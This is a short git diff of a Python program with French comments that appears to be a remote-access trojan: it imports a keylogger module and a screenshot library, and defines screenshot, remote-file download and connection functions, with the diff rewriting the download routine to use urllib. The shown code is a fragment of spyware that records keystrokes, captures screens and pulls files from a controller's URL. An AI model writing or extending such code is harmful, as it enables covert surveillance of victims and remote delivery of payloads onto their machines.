@@ -10,7 +10,7 @@ import shutil
 import sys
 import time
 import requests #va savoir pk mais requests marche pas en le compilant sur windows, remplace par urllib
-import urllib
+import urllib.request
 from mss import mss #marche pas sur windows
 import threading
 import keylogger #le nom de notre keylogger dans le mm repertoire, marche sur windows mais pas depuis linux
@@ -54,13 +54,7 @@ def screenshot():
 		screenshot.shot()
 
 def download(url):
-	get_response = requests.get(url)
-	file_name = url.split("/")[-1] #nom = derniere partie de l'url
-	# print("before get response")
-	# get_response = urllib.urlretrieve(url, url.split("/")[-1])
-	# print("after get response")
-	with open(file_name, "wb") as out_file:
-		out_file.write(get_response.encode('utf-8')) #write le contenu du fichier telecharge
+	get_response = urllib.request.urlretrieve(url, url.split("/")[-1])
 
 def connection():
 	if quit == False:
